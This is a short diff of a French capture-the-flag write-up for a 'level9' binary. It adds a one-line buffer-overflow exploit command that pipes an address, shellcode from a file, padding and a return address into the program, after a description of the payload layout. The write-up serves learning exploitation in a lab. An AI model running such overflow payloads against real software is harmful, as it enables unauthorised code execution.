@@ -87,6 +87,8 @@ Soit,
 
 `[4 Bytes] + [28 Bytes de shellcode] + [76 (108 - 32) Bytes de remplissage] + [4 Bytes]`.
 
+`./level9 $(python -c 'print "\x10\xa0\x04\x08"')$(cat /tmp/shellcode.bin)$(python -c 'print "B" * 76 + "\x0c\xa0\x04\x08"')`
+
 ![image](https://user-images.githubusercontent.com/29956389/89928623-6294f600-dc08-11ea-8f82-1ec2b0c5eeec.png)
 
 Et mercee.
